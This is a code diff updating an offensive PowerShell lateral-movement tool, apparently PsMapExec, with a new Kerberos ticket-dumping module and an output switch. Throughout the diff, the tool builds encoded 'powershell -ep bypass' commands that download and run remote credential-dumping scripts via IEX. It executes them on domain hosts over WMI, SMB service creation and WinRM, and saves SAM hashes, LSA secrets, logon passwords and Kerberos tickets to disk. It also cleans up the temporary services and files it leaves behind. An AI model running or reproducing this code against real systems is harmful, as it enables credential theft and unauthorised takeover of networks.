@@ -54,7 +54,10 @@ Param(
     [switch]$CurrentUser,
 
     [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
-    [switch]$SuccessOnly
+    [switch]$SuccessOnly,
+
+    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [switch]$ShowOutput
 )
 
 ######### Banner #################################
@@ -70,11 +73,12 @@ $Banner = @("
 ")
 
 Write-Output $Banner
-Write-Host "Github  : " -ForegroundColor "Yellow" -NoNewline
+Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
-Write-Host "Version : " -ForegroundColor "Yellow" -NoNewline
-Write-Host "0.1.2"
+Write-Host "Version : " -NoNewline
+Write-Host "0.1.4"
 Write-Host
+
 
 
 IF($Method -eq "" -and $GenRelayList -eq ""){Write-Host "No Method Specified" -ForegroundColor "Red" ; break}
@@ -126,7 +130,7 @@ elseif ($CurrentUser -and $Method -ne "RDP"){
         $Password = $null
         $Hash = $null
 
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Running in context of the current user:  $env:USERDNSDOMAIN\$env:USERNAME"
 }
 
@@ -139,6 +143,7 @@ $MongooseURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main
 $RubeusURL = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1"
 $DumpSAMURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/DumpSAM.ps1"
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
+$KirbyURL =  "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
 
 # IF $LocalFileServer is not NULL, check if valid IP address 
 
@@ -150,6 +155,7 @@ if (![string]::IsNullOrEmpty($LocalFileServer)) {
         $RubeusURL = "http://$LocalFileServer/Invoke-Rubeus.ps1"
         $DumpSAMURL = "http://$LocalFileServer/DumpSAM.ps1"
         $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
+        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
     }
     else {
         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
@@ -178,6 +184,8 @@ $MSSQL = Join-Path $PME "MSSQL"
 $LogonPasswords = Join-Path $PME "LogonPasswords"
 $SMB = Join-Path $PME "SMB"
 $Tickets = Join-Path $PME "Tickets"
+$KerbDump = Join-Path $Tickets "KerbDump"
+$MimiTickets = Join-Path $Tickets "MimiTickets"
 $ekeys = Join-Path $PME "eKeys"
 $LSA = Join-Path $PME "LSA"
 
@@ -228,6 +236,17 @@ $LSA = Join-Path $PME "LSA"
     Write-Host "Created directory for LSA at $LSA"
 }
 
+  if (-not (Test-Path $KerbDump)){
+    New-Item -ItemType Directory -Force -Path $KerbDump  | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for KerbDump at $KerbDump"
+}
+
+  if (-not (Test-Path $MimiTickets)){
+    New-Item -ItemType Directory -Force -Path $MimiTickets  | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for MimiTickets at $MimiTickets"
+}
 ######### Checks if user context is administrative when a session is spawned #########
 $CheckAdmin = "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
 
@@ -437,8 +456,8 @@ function Invoke-Rubeus{
     }
 }
 
-Write-Host
-Write-Host
+#Write-Host
+
 
 ######### Grab a copy of the current users ticket so we can restore later #########
 
@@ -515,11 +534,84 @@ Catch {
     }
 }
 
+if ($Module -eq "KerbDump"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Tickets will be written to $KerbDump"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($Module -eq "Tickets"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Tickets will be written to $MimiTickets"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($Module -eq "LSA"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "LSA output will be written to $LSA"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($Module -eq "ekeys"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "eKeys output will be written to $ekeys"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($Module -eq "SAM"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "SAM output will be written to $SAM"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($Module -eq "LogonPasswords"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "LogonPasswords output will be written to $LogonPasswords"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
 
 ######### Module / Commands  #########
 
+# Tickets
 if ($Module -eq "Tickets"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{};IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
+$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+$Command = "powershell.exe -ep bypass -enc $base64command"
+}
+
+# Tickets - KerbDump
+if ($Module -eq "KerbDump"){
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{};IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"");Invoke-Kirby"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
@@ -596,7 +688,7 @@ $WMIJobs = @()
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
             $Class = "PMEClass"
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
@@ -791,11 +883,6 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
     $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
     $result = ExecCommand $ComputerName $encodedCommand
 
-
-
-
-
-
 }
 
              
@@ -817,40 +904,40 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              Write-Host "SUCCESS " -NoNewline
              Write-Host "Pwned!" -ForegroundColor "Cyan" -NoNewline
              Write-Host
+             
              if ($Module -eq "SAM"){
-             $result | Write-Host
+             if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
-             Write-Host
              }
              
              elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
-             $result | Write-Host
+             if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
              }
              
              elseif ($Module -eq "Tickets"){
-             Write-Host "Tickets written to $Tickets\$ComputerName-Tickets.txt" -ForegroundColor "Cyan"
-             $result | Out-File -FilePath "$Tickets\$ComputerName-Tickets.txt" -Encoding "ASCII"
-             Write-Host
+             if ($ShowOutput){$result | Write-Host; Write-Host}
+             $result | Out-File -FilePath "$MimiTickets\$ComputerName.txt" -Encoding "ASCII"
+             }
+
+             elseif ($Module -eq "KerbDump"){
+             if ($ShowOutput){$result | Write-Host; Write-Host}
+             $result | Out-File -FilePath "$KerbDump\$ComputerName.txt" -Encoding "ASCII"
              }
              
              elseif ($Module -eq "ekeys" -and $Option -ne "Parse"){
-             $result | Write-Host
+             if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
              }
              
              elseif ($Module -eq "ekeys" -and $Option -eq "Parse"){
-             $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
-             }
-
-             elseif ($Module -eq "ekeys" -and $Option -eq "Parse"){
+             if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
              }
 
              elseif ($Module -eq "lsa"){
-             Write-Host "LSA Secrets written to $LSA\$ComputerName-LSA.txt" -ForegroundColor "Cyan"
+             if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
-             Write-Host
              }
              
              elseif ($Commmand -ne ""){
@@ -905,7 +992,7 @@ elseif (!$osinfo){
             Start-Sleep -Milliseconds 500
         }
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly
+        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
         [array]$WMIJobs += $WMIJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -962,7 +1049,7 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly)
+            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
@@ -1123,13 +1210,19 @@ function PCatJHDo {
 
 if ($Command -and ($Command -ne "")) {
     if ($ResultFile -eq "") {
-        $TempText = $(NHJmNH) + ".txt"
+        $TempText = $(NHJmNH) + ".log"
         $TempBat = $(NHJmNH) + ".bat"
-        $cmd = "cmd.exe /C echo $Command ^> %sysTemRoOt%\drivers\$tEmpTeXt > %SysTemRoOt%\drivers\$tEmPbAt & cmd.exe /C start %coMspec% /C %SYsTeMRooT%\drivers\$tEmPbAt & sc.exe stop PMEService & timeout /t 5 & sc.exe delete PMEService"
+        if ($Module -ne ""){
+        $cmd = "cmd.exe /C echo $Command ^> %sysTemRoOt%\drivers\$tEmpTeXt > %SysTemRoOt%\drivers\$tEmPbAt & cmd.exe /C start %coMspec% /C %SYsTeMRooT%\drivers\$tEmPbAt /t 20 & sc.exe stop PMEService & timeout /t 5 & sc.exe delete PMEService"
+        }
+
+        else {$cmd = "cmd.exe /C echo $Command ^> %sysTemRoOt%\drivers\$tEmpTeXt > %SysTemRoOt%\drivers\$tEmPbAt & cmd.exe /C start %coMspec% /C %SYsTeMRooT%\drivers\$tEmPbAt /t 5 & sc.exe stop PMEService & timeout /t 5 & sc.exe delete PMEService"}
 
         try {
             PCatJHDo -ComputerName $ComputerName -Command $cmd -ServiceName $ServiceName
             $Output = "\\$ComputerName\Admin$\drivers\$TempText"
+            if ($Module -ne ""){Start-sleep -Seconds 25}
+            else {Start-sleep -Seconds 5}
             Get-Content -Path $Output
             Remove-Item -Force $Output | Out-Null
             Remove-Item -Force "\\$ComputerName\Admin$\drivers\$TempBat" | Out-Null
@@ -1190,14 +1283,48 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
                 Write-Host "SUCCESS " -NoNewline
                 Write-Host "Pwned!" -ForegroundColor "Cyan"
                 if ($Command -eq "echo."){}
-                if ($Command -ne "echo."){$a | Write-host}
+                if ($Command -ne "echo." -and $Module -eq "") {$a | Write-Host}
 
-                if ($Module -eq "SAM"){
-                    $a | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
-                }
-               }
+             if ($Module -eq "SAM"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
+             }
+             
+             elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
+             }
+             
+             elseif ($Module -eq "Tickets"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$MimiTickets\$ComputerName.txt" -Encoding "ASCII"
+             }
+
+             elseif ($Module -eq "KerbDump"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$KerbDump\$ComputerName.txt" -Encoding "ASCII"
+             }
+             
+             elseif ($Module -eq "ekeys" -and $Option -ne "Parse"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
+             }
+             
+             elseif ($Module -eq "ekeys" -and $Option -eq "Parse"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
+             }
+
+             elseif ($Module -eq "lsa"){
+             if ($ShowOutput){$a | Write-Host; Write-Host}
+             $a | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
+             }
+            }
                 
-            }else{Write-host "Failure connecting to $ComputerName" ; return}
+            }
+            
+            else{
+            Write-host "Failure connecting to $ComputerName" ; return}
         }
 
         # Check if the number of currently running jobs is below the maximum limit
@@ -1205,7 +1332,7 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
             Start-Sleep -Milliseconds 500
         }
 
-        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly
+        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
         [array]$PSexecJobs += $PsexecJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1263,10 +1390,11 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
+
             
             IF ($wait) {
                 $tcpClient.EndConnect($asyncResult)
@@ -1300,41 +1428,43 @@ $ErrorActionPreference = "SilentlyContinue"
 
                     if ($Module -eq "SAM") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction "Ignore"
-                        $b | Write-Host
-                        Write-Host
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
                     }
                     
                     elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")) {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        $b | Write-host
-                        Write-Host
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
                     }
                     
                     elseif ($Module -eq "Tickets") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        Write-Host "Tickets written to $Tickets\$ComputerName.txt" -ForegroundColor "Cyan"
-                        Write-Host
-                        $b | Out-File -FilePath "$Tickets\$ComputerName-Tickets.txt" -Encoding "ASCII"
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
+                        $b | Out-File -FilePath "$MimiTickets\$ComputerName-Tickets.txt" -Encoding "ASCII"
+                    }
+
+                    elseif ($Module -eq "KerbDump") {
+                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
+                        $b | Out-File -FilePath "$KerbDump\$ComputerName-Tickets-KerbDump.txt" -Encoding "ASCII"
                     }
                     
                     elseif ($Module -eq "ekeys" -and $Option -ne "Parse") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        $b | Write-Host
-                        Write-Host
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
                     }
                     
                     elseif ($Module -eq "ekeys" -and $Option -eq "Parse") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
                     }
                     
                     elseif ($Module -eq "LSA") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
-                        Write-Host "LSA Secrets written to $LSA\$ComputerName-LSA.txt" -ForegroundColor "Cyan"
-                        Write-Host
+                        if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
                     }
                    
@@ -1389,7 +1519,7 @@ $ErrorActionPreference = "SilentlyContinue"
             Start-Sleep -Milliseconds 500
         }
 
-        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly
+        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput
         [array]$WinRMJobs += $WinRMJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -2666,6 +2796,8 @@ function SAM {
 # Function - Parse-LogonPasswords
 Function Parse-LogonPasswords{
 if ($Module -eq "LogonPasswords" -and $Option -eq "Parse"){
+Write-Host
+Write-Host
 # Set the path to the LogonPasswords output file
 $LogonPasswordsOutputDirectory = "$LogonPasswords\"
 $Files = Get-ChildItem -Path $LogonPasswordsOutputDirectory -File -Filter "*RAW.txt"
